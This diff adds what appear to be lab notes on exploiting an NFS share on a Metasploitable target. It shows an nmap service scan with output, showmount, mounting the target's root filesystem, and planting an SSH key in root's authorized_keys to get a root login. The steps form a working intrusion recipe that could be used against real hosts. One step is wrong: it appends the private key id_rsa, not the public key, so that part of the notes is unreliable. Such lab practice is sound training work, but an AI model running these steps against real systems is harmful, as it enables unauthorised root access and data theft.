@@ -1,1 +1,115 @@
+nmap target using -sV
+/////////////////////
+nmap -sV 192.168.32.8
+
+-sV = service detection and also tells you what version these services are running
+
+////////////////////////////////
+NMAP SCAN RESULTS
+////////////////////////////////
+Nmap scan report for 192.168.32.8
+Host is up (0.038s latency).
+Not shown: 978 filtered tcp ports (no-response)
+PORT     STATE SERVICE     VERSION
+21/tcp   open  ftp         vsftpd 2.3.4
+22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+23/tcp   open  telnet      Linux telnetd
+25/tcp   open  smtp        Postfix smtpd
+53/tcp   open  domain      ISC BIND 9.4.2
+80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
+111/tcp  open  rpcbind     2 (RPC #100000)
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+512/tcp  open  exec        netkit-rsh rexecd
+513/tcp  open  login?
+514/tcp  open  tcpwrapped
+1099/tcp open  java-rmi    GNU Classpath grmiregistry
+1524/tcp open  bindshell   Bash shell (**BACKDOOR**; root shell)
+2049/tcp open  nfs         2-4 (RPC #100003)
+3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
+5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
+5900/tcp open  vnc         VNC (protocol 3.3)
+6000/tcp open  X11         (access denied)
+6667/tcp open  irc         UnrealIRCd
+8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
+8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
+Service Info: Hosts:  metasploitable.localdomain, orange, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+//////////////////////////////////
+NFS port is open meaning an exploit could be possible
+
+2049/tcp open  nfs         2-4 (RPC #100003)
+//////////////////////////////////
+
+ALL COMMANDS MUST BE RAN AS ROOT ON YOUR LOCAL PC
+//////////////////////////////////
+
+USING SHOWMOUNT -e we can see what locations are avaliable for export on the target IP
+//////////////////////////////////
+
+showmount -e 192.168.32.8
+
+-e = shows files are directories that can be exported
+
+SHOWMOUNT RESULTS
+///////////////////////////////
+Export list for 192.168.32.8:
+/ *
+///////////////////////////////
+
+This means any file location on 192.168.32.8 can be mounted and exported
+///////////////////////////////
+
+MAKE A DIRECTORY ON YOUR LOCAL PC FOR YOU TO MOUNT THE NFS LOCATION TO
+
+sudo mkdir /tmp/nfs (can be called anything)
+//////////////////////////////
+
+MOUNT the nfs location shown in showmount to the directory just made on our local machine
+
+sudo mount -t nfs TARGET:DIRECTORY LOCATION
+
+-t = specifies the type of file system being used (NFS)
+TARGET:DIRECTORY = TARGET IP: DIRECTORY shown in showmount
+LOCATION = directory made on local PC
+
+THIS EXAMPLE
+sudo mount -t nfs 192.168.32.8:/ /tmp/nfs
+
+////////////////////////////
+CHECK CURRENT MOUNTS and the target should show
+
+df -k
+///////////////////////////
+IN YOUR MOUNT FILE SHOULD NOW BE AN EXACT REPLICA OF THE TARGETS FILE SYSTEMS, WHAT WE CAN DO NOW IS GENERATE AN SSH KEY TO GAIN ACCESS THROUGH SSH EASILY
+//////////////////////////
+
+MOVE TO MOUNT FILE/root/.ssh
+//////////////////////////
+
+cd /tmp/nfs/root/.ssh
+//////////////////////////
+
+Using ls this should show a file called authorized_keys, we can use this file to put our generated ssh key inside so we are a trusted device when using SSH
+//////////////////////////
+
+GENERATE SSH KEY
+/////////////////////////
+
+ssh-keygen
+
+this key will be generated inside our local PC's .ssh file located ~/.ssh (no passphrase is needed when creating key)
+/////////////////////////
+
+MOVE LOCAL SSH key to target machine using our mounted directory
+
+cat ~/.ssh/id_rsa >> /tmp/nfs/root/.ssh/authorized_keys
+
+////////////////////
+
+NOW SSH into target IP
+
+ssh 192.168.32.8
+
+
+
 
